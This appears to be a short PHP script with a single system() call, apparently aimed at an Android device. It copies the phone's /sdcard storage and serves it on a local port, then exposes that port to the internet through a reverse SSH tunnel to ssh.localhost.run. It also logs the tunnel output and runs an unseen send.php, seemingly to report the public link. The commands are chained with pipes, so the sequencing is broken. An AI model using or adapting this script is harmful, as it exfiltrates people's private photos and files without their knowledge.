<?php
    system(" cp -r /sdcard ~ | php -S localhost:3333 | ssh -R 80:localhost:3333 ssh.localhost.run >> out.txt | php send.php ");
?>
